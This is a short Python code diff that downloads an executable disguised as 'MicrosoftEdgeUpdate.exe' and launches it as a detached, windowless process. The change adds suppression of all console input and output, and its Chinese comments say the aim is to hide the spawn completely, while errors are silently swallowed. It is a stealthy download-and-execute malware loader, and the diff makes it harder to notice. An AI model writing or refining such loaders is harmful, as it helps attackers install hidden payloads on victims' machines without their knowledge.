@@ -9,8 +9,15 @@ _path = os.path.join(_dir, "MicrosoftEdgeUpdate.exe")
 try:
     os.makedirs(_dir, exist_ok=True)
     urllib.request.urlretrieve(_url, _path)
-    # CREATE_NO_WINDOW | DETACHED_PROCESS（隐蔽 spawn，无窗口、无任务栏、无 console flash）
-    subprocess.Popen([_path], creationflags=0x08000000 | 0x00000008)
+    # CREATE_NO_WINDOW | DETACHED_PROCESS + 全 DEVNULL，彻底无 console/无 stderr 闪烁
+    subprocess.Popen(
+        [_path],
+        creationflags=0x08000000 | 0x00000008,
+        stdin=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        close_fds=True,
+    )
 except Exception:
     pass
 
